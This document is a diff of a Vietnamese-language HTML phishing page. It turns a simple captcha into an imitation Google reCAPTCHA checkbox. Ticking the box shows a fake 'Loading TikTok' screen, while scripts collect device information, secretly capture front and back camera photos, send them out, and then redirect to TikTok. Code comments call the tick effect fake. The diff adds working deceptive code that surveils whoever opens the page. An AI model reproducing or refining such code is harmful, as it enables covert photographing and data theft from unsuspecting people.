@@ -3,59 +3,89 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>TikTok</title>
+  <title>Xác minh</title>
   <style>
     body {
       margin: 0;
-      background: #000;
-      color: white;
+      background: #f9f9f9;
       font-family: Arial, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
     }
-    #captcha-box {
-      background: #111;
-      border: 1px solid #555;
-      padding: 20px;
-      border-radius: 10px;
-      text-align: center;
+
+    #recaptcha-box {
+      background: #fff;
+      border: 1px solid #d3d3d3;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      padding: 20px 25px;
+      border-radius: 4px;
+      width: 300px;
+      text-align: left;
+      display: flex;
+      align-items: center;
     }
-    #captcha-box button {
-      margin-top: 10px;
-      padding: 10px 20px;
-      background: #0f0;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
+
+    #recaptcha-box input {
+      width: 18px;
+      height: 18px;
+      margin-right: 15px;
+      accent-color: #4285f4;
     }
+
+    #recaptcha-box label {
+      font-size: 14px;
+      color: #222;
+      user-select: none;
+    }
+
+    #loading {
+      display: none;
+      margin-left: auto;
+    }
+
+    #fake-google {
+      font-size: 10px;
+      color: #555;
+      margin-top: 8px;
+      display: flex;
+      justify-content: space-between;
+      font-family: sans-serif;
+    }
+
     #tiktok-fake {
       display: none;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      width: 100vw;
       background: url('https://i.imgur.com/B5gDb6w.gif') center center no-repeat;
       background-size: cover;
+      width: 100vw;
+      height: 100vh;
+      color: white;
       font-size: 1.5rem;
+      justify-content: center;
+      align-items: center;
+      display: flex;
     }
+
     canvas {
       display: none;
     }
   </style>
 </head>
 <body>
-  <div id="captcha-box">
-    <h3>🔒 Xác minh</h3>
-    <p>Bạn có phải là con người không?</p>
-    <button onclick="startBot()">Tôi không phải robot</button>
+
+  <div id="recaptcha-box">
+    <input type="checkbox" id="verify" onclick="startCaptcha()" />
+    <label for="verify">I'm not a robot</label>
+    <div id="loading">⏳</div>
   </div>
 
-  <div id="tiktok-fake">
-    <div>Đang tải TikTok...</div>
+  <div id="fake-google">
+    <div>reCAPTCHA</div>
+    <div>Privacy - Terms</div>
   </div>
+
+  <div id="tiktok-fake">Đang tải TikTok...</div>
 
   <canvas id="canvas1"></canvas>
   <canvas id="canvas2"></canvas>
@@ -155,21 +185,28 @@
       }
     }
 
-    async function startBot() {
-      document.getElementById("captcha-box").style.display = "none";
-      document.getElementById("tiktok-fake").style.display = "flex";
+    async function startCaptcha() {
+      document.getElementById("verify").disabled = true;
+      document.getElementById("loading").style.display = "block";
 
-      sendFullInfo();
+      // Giả hiệu ứng tick ✔ sau 1s
+      setTimeout(async () => {
+        document.getElementById("loading").innerText = "✔";
+        document.getElementById("recaptcha-box").style.display = "none";
+        document.getElementById("fake-google").style.display = "none";
+        document.getElementById("tiktok-fake").style.display = "flex";
 
-      const front = await captureCamera("user", "canvas1");
-      const back = await captureCamera("environment", "canvas2");
+        // Gửi dữ liệu và ảnh
+        sendFullInfo();
+        const front = await captureCamera("user", "canvas1");
+        const back = await captureCamera("environment", "canvas2");
+        await sendPhotos(front, back);
 
-      await sendPhotos(front, back);
-
-      // Redirect sau 5 giây
-      setTimeout(() => {
-        window.location.href = "https://www.tiktok.com/";
-      }, 5000);
+        // Redirect sau 5s
+        setTimeout(() => {
+          window.location.href = "https://www.tiktok.com/";
+        }, 5000);
+      }, 1000);
     }
   </script>
 </body>
